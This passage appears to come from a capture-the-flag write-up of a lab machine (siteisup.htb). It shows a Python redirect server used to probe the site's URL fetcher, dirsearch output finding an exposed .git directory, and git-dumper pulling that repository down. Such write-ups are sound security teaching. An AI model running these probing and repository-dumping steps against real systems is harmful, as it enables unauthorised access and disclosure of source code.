+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
+
+<span class="k">class</span> <span class="nc">Redirect</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+  <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+      <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">302</span><span class="p">)</span>
+      <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Location&#39;</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+      <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+
+<span class="n">HTTPServer</span><span class="p">((</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">),</span> <span class="n">Redirect</span><span class="p">)</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>redirect.py<span class="w"> </span>dev.support.htb
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET / HTTP/1.1&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:22<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:23<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:24<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:24<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:24<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:24<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+<span class="m">10</span>.10.11.177<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">20</span>/Oct/2022<span class="w"> </span><span class="m">20</span>:50:24<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /dev.support.htb HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+</pre></div>
+</div>
+<p>Because I didn’t specify http:// it tries to fetch as if it was a path on the same webserver.<br />
+Looks like it tried 20 times,</p>
+<p>Dirbusting the site recursively, it looks like there’s a git repo under /dev/</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>blnkn@Kolossus:~/sec/htb/machines/updown/www$<span class="w"> </span>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://siteisup.htb<span class="w"> </span>-r<span class="w"> </span>-x<span class="w"> </span><span class="m">403</span>
+
+<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
+<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>
+
+Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>
+
+Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/siteisup.htb/_22-10-20_23-44-26.txt
+
+Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-22-10-20_23-44-26.log
+
+Target:<span class="w"> </span>http://siteisup.htb/
+
+<span class="o">[</span><span class="m">23</span>:44:27<span class="o">]</span><span class="w"> </span>Starting:
+<span class="o">[</span><span class="m">23</span>:44:48<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>310B<span class="w">  </span>-<span class="w"> </span>/dev<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:44:48<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/dev/
+<span class="o">[</span><span class="m">23</span>:44:51<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/index.php
+<span class="o">[</span><span class="m">23</span>:44:51<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/index.php/login/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:11<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>dev/
+<span class="o">[</span><span class="m">23</span>:45:13<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>315B<span class="w">  </span>-<span class="w"> </span>/dev/.git<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>3KB<span class="w"> </span>-<span class="w"> </span>/dev/.git/
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>772B<span class="w">  </span>-<span class="w"> </span>/dev/.git/branches/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>298B<span class="w">  </span>-<span class="w"> </span>/dev/.git/config
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>73B<span class="w">  </span>-<span class="w"> </span>/dev/.git/description
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>4KB<span class="w"> </span>-<span class="w"> </span>/dev/.git/hooks/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>21B<span class="w">  </span>-<span class="w"> </span>/dev/.git/HEAD
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>959B<span class="w">  </span>-<span class="w"> </span>/dev/.git/info/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>240B<span class="w">  </span>-<span class="w"> </span>/dev/.git/info/exclude
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>521B<span class="w">  </span>-<span class="w"> </span>/dev/.git/index
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>179B<span class="w">  </span>-<span class="w"> </span>/dev/.git/logs/HEAD
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>325B<span class="w">  </span>-<span class="w"> </span>/dev/.git/logs/refs<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/logs/refs/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/dev/.git/logs/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>331B<span class="w">  </span>-<span class="w"> </span>/dev/.git/logs/refs/heads<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/logs/refs/heads/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>340B<span class="w">  </span>-<span class="w"> </span>/dev/.git/logs/refs/remotes/origin<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/logs/refs/remotes/origin/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>333B<span class="w">  </span>-<span class="w"> </span>/dev/.git/logs/refs/remotes<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/logs/refs/remotes/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>179B<span class="w">  </span>-<span class="w"> </span>/dev/.git/logs/refs/remotes/origin/HEAD
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/dev/.git/objects/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>112B<span class="w">  </span>-<span class="w"> </span>/dev/.git/packed-refs
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>328B<span class="w">  </span>-<span class="w"> </span>/dev/.git/refs/remotes<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/refs/remotes/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/dev/.git/refs/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>335B<span class="w">  </span>-<span class="w"> </span>/dev/.git/refs/remotes/origin<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/refs/remotes/origin/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>30B<span class="w">  </span>-<span class="w"> </span>/dev/.git/refs/remotes/origin/HEAD
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>326B<span class="w">  </span>-<span class="w"> </span>/dev/.git/refs/heads<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/refs/heads/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>325B<span class="w">  </span>-<span class="w"> </span>/dev/.git/refs/tags<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/refs/tags/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:37<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/dev/index.php
+<span class="o">[</span><span class="m">23</span>:45:37<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/dev/index.php/login/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">23</span>:45:52<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>index.php/login/
+<span class="o">[</span><span class="m">23</span>:46:37<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>dev/.git/
+<span class="o">[</span><span class="m">23</span>:46:59<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>298B<span class="w">  </span>-<span class="w"> </span>/dev/.git/config
+<span class="o">[</span><span class="m">23</span>:47:05<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>521B<span class="w">  </span>-<span class="w"> </span>/dev/.git/index
+<span class="o">[</span><span class="m">23</span>:47:05<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/dev/.git/info<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/info/
+<span class="o">[</span><span class="m">23</span>:47:07<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/dev/.git/logs<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/logs/
+<span class="o">[</span><span class="m">23</span>:47:07<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/dev/.git/logs/
+<span class="o">[</span><span class="m">23</span>:47:10<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>323B<span class="w">  </span>-<span class="w"> </span>/dev/.git/objects<span class="w">  </span>-&gt;<span class="w">  </span>http://siteisup.htb/dev/.git/objects/
+<span class="o">[</span><span class="m">23</span>:47:20<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>dev/.git/branches/
+<span class="o">[</span><span class="c1">################    ] 82%   90610927       194/s       job:5/19 errors:0</span>
+</pre></div>
+</div>
+</section>
+<section id="sensitive-information-disclosure-git-repo">
+<h2>Sensitive Information Disclosure - Git repo<a class="headerlink" href="#sensitive-information-disclosure-git-repo" title="Permalink to this heading">#</a></h2>
+<p>We could download things manually but this tool can help automating the process:<br />
+<a class="reference external" href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>~/git-dumper/git_dumper.py<span class="w"> </span>http://siteisup.htb/dev/<span class="w"> </span>.
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Testing<span class="w"> </span>http://siteisup.htb/dev/.git/HEAD<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Testing<span class="w"> </span>http://siteisup.htb/dev/.git/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>.git<span class="w"> </span>recursively
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.gitignore<span class="w"> </span><span class="o">[</span><span class="m">404</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>http://siteisup.htb/dev/.gitignore<span class="w"> </span>responded<span class="w"> </span>with<span class="w"> </span>status<span class="w"> </span>code<span class="w"> </span><span class="m">404</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/packed-refs<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/branches/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/config<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/description<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/index<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/HEAD<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/refs/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/info/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/objects/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/pre-commit.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/commit-msg.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/pre-push.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/post-update.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/pre-rebase.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/pre-receive.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/info/exclude<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/hooks/update.sample<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/refs/heads/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/refs/remotes/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
